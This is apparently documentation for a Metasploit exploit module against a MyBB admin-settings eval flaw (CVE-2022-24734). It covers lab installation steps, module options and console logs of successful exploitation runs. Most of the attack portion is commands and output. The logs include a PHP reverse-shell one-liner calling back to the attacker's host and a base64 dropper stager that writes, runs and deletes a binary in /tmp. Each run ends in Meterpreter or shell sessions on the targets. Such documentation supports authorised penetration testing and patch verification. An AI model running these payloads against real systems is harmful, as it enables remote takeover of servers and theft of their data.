## Vulnerable Application

This exploit module leverages an improper input validation vulnerability in
MyBB prior to `1.8.30` to execute arbitrary code in the context of the user
running the application.

MyBB Admin Control setting page calls PHP `eval` function with an unsanitized
user input. The exploit adds a new setting, injecting the payload in the
vulnerable field, and triggers its execution with a second request. Finally, it
takes care of cleaning up and removes the setting.

Note that authentication is required for this exploit to work and the account
must have rights to add or update settings (typically, myBB administrator
role).

## Installation Steps

### Linux with Docker
- Use this `docket-compose.yml` file (see [this](https://github.com/mybb/docker#-via-docker-stack-deploy-or-docker-compose)):
```
services:
  mybb:
    image: mybb/mybb:1.8.29
    volumes:
    - ${PWD}/mybb:/var/www/html:rw

  nginx:
    image: nginx:mainline-alpine
    ports:
    - published: 8080
      target: 80
    volumes:
    - ${PWD}/nginx:/etc/nginx/conf.d:ro
    - ${PWD}/mybb:/var/www/html:ro

  postgresql:
    environment:
      POSTGRES_DB: mybb
      POSTGRES_PASSWORD: changeme
      POSTGRES_USER: mybb
    image: postgres:14-alpine
    volumes:
    - ${PWD}/postgres/data:/var/lib/postgresql/data:rw

version: '3.8'
```
- Create `nginx/default.conf`
```
  upstream mybb {
      server mybb:9000 weight=5;
  }

  server {
      listen 80;

      root /var/www/html;
      index index.html index.php;

      location / {
          try_files $uri $uri/ /index.php?$args;
      }

      location ~ inc/ {
          internal;
      }

      location ~ ^/(images|cache|jscripts|uploads)/ {
          access_log off;
      }

      location ~ \.php$ {
          try_files $uri =404;
          fastcgi_split_path_info ^(.+\.php)(/.+)$;
          fastcgi_pass mybb;
          fastcgi_index index.php;
          include fastcgi_params;
          fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
          fastcgi_param PATH_INFO $fastcgi_path_info;
      }
  }
```
- Run `docker-compose up`.
- Access the application at `http://127.0.0.1:8080/install` and finish the installation process.

### Windows with Nginx, PHP and MySQL
- Install MySQL:
  - Follow the installation process [here](https://dev.mysql.com/doc/refman/8.0/en/windows-installation.html)
- Install PHP:
  - Download PHP (Non Thread Safe) [here](http://windows.php.net/download/)
  - Extract everything to `C:\php`
  - run:
```
    cd C:\php
    set PHP_FCGI_CHILDREN=5
    set PHP_FCGI_MAX_REQUESTS=500
    php-cgi.exe -b 127.0.0.1:9999
```
- Install Nginx:
  - Download Nginx [here](http://nginx.org/en/download.html)
  - Extract everything to `C:\nginx`
  - Set the following options to `C:\nginx\nginx.conf`
```
    worker_processes  auto;
    ...
	server {
        listen 80;

        root www;
        index index.html index.php;

        location / {
            try_files $uri $uri/ /index.php?$args;
        }

        location ~ inc/ {
            internal;
        }

        location ~ ^/(images|cache|jscripts|uploads)/ {
            access_log off;
        }

        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_split_path_info ^(.+\.php)(/.+)$;
            fastcgi_pass 127.0.0.1:9999;
            fastcgi_index index.php;
            include fastcgi_params;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param PATH_INFO $fastcgi_path_info;
        }
	}
```
  - Run:
```
    cd C:\nginx
    start nginx.exe
```
- Install MyBB
  - Follow the installation process [here](https://docs.mybb.com/1.8/install/).

## Verification Steps
1. Install the application (see [Installation Steps](#installation-steps))
1. Start msfconsole
1. Do: `use exploit/multi/http/mybb_rce_cve_2022_24734`
1. Do: `run LHOST=<local host IP> RHOSTS=<remote host IP> USERNAME=<MyBB user> PASSWORD=<MyBB password>`
1. You should get a shell.
1. Try again with a different targets

## Options

### USERNAME

The username of a privileged MyBB account. It must have rights to add or update setting (usually with the administrator role)

### PASSWORD

The password of the MyBB account.

## Scenarios

### Windows (target 0 - PHP)
```
msf6 exploit(multi/http/mybb_rce_cve_2022_24734) > run Verbose=true LHOST=192.168.1.44 RHOSTS=192.168.1.215 USERNAME=msfuser PASSWORD=123456
[*] Started reverse TCP handler on 192.168.1.44:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] MyBB forum found running at /
[!] The service is running, but could not be validated.
[*] Attempting login
[+] Login successful!
[*] Adding a malicious settings
[*] Adding a crafted configuration setting entry with the payload
[+] Payload successfully sent
[*] Triggering the payload execution
[*] Sending stage (39860 bytes) to 192.168.1.215
[*] Meterpreter session 1 opened (192.168.1.44:4444 -> 192.168.1.215:63777) at 2022-05-23 15:41:40 +0200
[*] Removing the configuration setting
[*] Grab the delete parameters
[*] Send the delete request
[*] Shell incoming...

meterpreter > sysinfo
Computer    : DC02
OS          : Windows NT DC02 10.0 build 17763 (Windows Server 2019) AMD64
Meterpreter : php/windows
```

### Linux (target 0 - PHP)
```
msf6 exploit(multi/http/mybb_rce_cve_2022_24734) > run Verbose=true LHOST=192.168.0.48 RHOSTS=127.0.0.1 RPORT=8080 USERNAME=msfuser PASSWORD=123456
[*] Started reverse TCP handler on 192.168.0.48:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] MyBB forum found running at /
[!] The service is running, but could not be validated.
[*] Attempting login
[+] Login successful!
[*] Adding a malicious settings
[*] Adding a crafted configuration setting entry with the payload
[+] Payload successfully sent
[*] Triggering the payload execution
[*] Sending stage (39860 bytes) to 192.168.0.48
[*] Meterpreter session 2 opened (192.168.0.48:4444 -> 192.168.0.48:50029) at 2022-05-23 15:41:58 +0200
[*] Removing the configuration setting
[*] Grab the delete parameters
[*] Send the delete request
[*] Shell incoming...

meterpreter > sysinfo
Computer    : e087259940a8
OS          : Linux e087259940a8 5.10.76-linuxkit #1 SMP Mon Nov 8 10:21:19 UTC 2021 x86_64
Meterpreter : php/linux
```

### Linux (target 1 - Unix (In-Memory))
```
msf6 exploit(multi/http/mybb_rce_cve_2022_24734) > set target 1
target => 1
msf6 exploit(multi/http/mybb_rce_cve_2022_24734) > run Verbose=true LHOST=192.168.0.48 RHOSTS=127.0.0.1 RPORT=8080 USERNAME=msfuser PASSWORD=123456
[+] php -r '$ctxt=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);while($s=@stream_socket_client("ssl://192.168.0.48:4444",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode("\n",$o);$o.="\n";fputs($s,$o);}}'&
[*] Started reverse SSL handler on 192.168.0.48:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] MyBB forum found running at /
[!] The service is running, but could not be validated.
[*] Attempting login
[+] Login successful!
[*] Adding a malicious settings
[*] Adding a crafted configuration setting entry with the payload
[+] Payload successfully sent
[*] Triggering the payload execution
[*] Removing the configuration setting
[*] Grab the delete parameters
[*] Send the delete request
[*] Shell incoming...
[*] Command shell session 3 opened (192.168.0.48:4444 -> 192.168.0.48:50151) at 2022-05-23 15:42:58 +0200


ls
backups
inc
index.php
jscripts
modules
styles
^C
Abort session 3? [y/N]  y
```

### Linux (target 2 - linux (Dropper))
```
msf6 exploit(multi/http/mybb_rce_cve_2022_24734) > run Verbose=true LHOST=192.168.0.48 RHOSTS=127.0.0.1 RPORT=8080 USERNAME=msfuser PASSWORD=123456
[*] Started reverse TCP handler on 192.168.0.48:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] MyBB forum found running at /
[!] The service is running, but could not be validated.
[*] Attempting login
[+] Login successful!
[*] Adding a malicious settings
[*] Generated command stager: ["echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKgBE2gCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/UAznK.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/jHFeb' < '/tmp/UAznK.b64' ; chmod +x '/tmp/jHFeb' ; '/tmp/jHFeb' ; rm -f '/tmp/jHFeb' ; rm -f '/tmp/UAznK.b64'"]
[*] Adding a crafted configuration setting entry with the payload
[+] Payload successfully sent
[*] Triggering the payload execution
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (989032 bytes) to 192.168.0.48
[*] Meterpreter session 4 opened (192.168.0.48:4444 -> 192.168.0.48:50213) at 2022-05-23 15:43:26 +0200
[*] Removing the configuration setting
[*] Grab the delete parameters
[*] Send the delete request
[*] Shell incoming...
[*] Command Stager progress - 100.00% done (763/763 bytes)

meterpreter > sysinfo
Computer     : 172.18.0.4
OS           :  (Linux 5.10.76-linuxkit)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

### Windows (target 3 - Windows (In-Memory))
```
msf6 exploit(multi/http/mybb_rce_cve_2022_24734) > set target 4
target => 4
msf6 exploit(multi/http/mybb_rce_cve_2022_24734) > run Verbose=true LHOST=192.168.1.44 RHOSTS=192.168.1.215 USERNAME=msfuser PASSWORD=123456

[*] Powershell command length: 4160
[*] Started reverse TCP handler on 192.168.1.44:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] MyBB forum found running at /
[!] The service is running, but could not be validated.
[*] Attempting login
[+] Login successful!
[*] Adding a malicious settings
[*] Adding a crafted configuration setting entry with the payload
[+] Payload successfully sent
[*] Triggering the payload execution
[*] Removing the configuration setting
[*] Grab the delete parameters
[*] Send the delete request
[*] Shell incoming...
[*] Sending stage (175174 bytes) to 192.168.1.215
[*] Meterpreter session 6 opened (192.168.1.44:4444 -> 192.168.1.215:59025) at 2022-05-30 15:58:01 +0200

meterpreter > sysinfo
Computer        : DC02
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MYLAB
Logged On Users : 8
Meterpreter     : x86/windows
```


### Windows (target 4 - Windows (Dropper))
```
msf6 exploit(multi/http/mybb_rce_cve_2022_24734) > set target 5
target => 5
msf6 exploit(multi/http/mybb_rce_cve_2022_24734) > run Verbose=true LHOST=192.168.1.44 RHOSTS=192.168.1.215 USERNAME=msfuser PASSWORD=123456
[*] Started reverse TCP handler on 192.168.1.44:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] MyBB forum found running at /
[!] The service is running, but could not be validated.
[*] Attempting login
[+] Login successful!
[*] Adding a malicious settings
[*] Generated command stager: ["echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAA...
[*] Adding a crafted configuration setting entry with the payload
[+] Payload successfully sent
[*] Triggering the payload execution
[*] Removing the configuration setting
[*] Grab the delete parameters
[*] Send the delete request
[*] Shell incoming...
[*] Command Stager progress -   2.01% done (2046/101881 bytes)
...
[*] Command Stager progress -  98.40% done (100252/101881 bytes)
[*] Adding a crafted configuration setting entry with the payload
[+] Payload successfully sent
[*] Triggering the payload execution
[*] Sending stage (175174 bytes) to 192.168.1.215
[*] Removing the configuration setting
[*] Grab the delete parameters
[*] Send the delete request
[*] Shell incoming...
[*] Command Stager progress - 100.00% done (101881/101881 bytes)
[*] Meterpreter session 7 opened (192.168.1.44:4444 -> 192.168.1.215:64264) at 2022-05-23 15:45:07 +0200

meterpreter > sysinfo
Computer        : DC02
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MYLAB
Logged On Users : 8
Meterpreter     : x86/windows
```
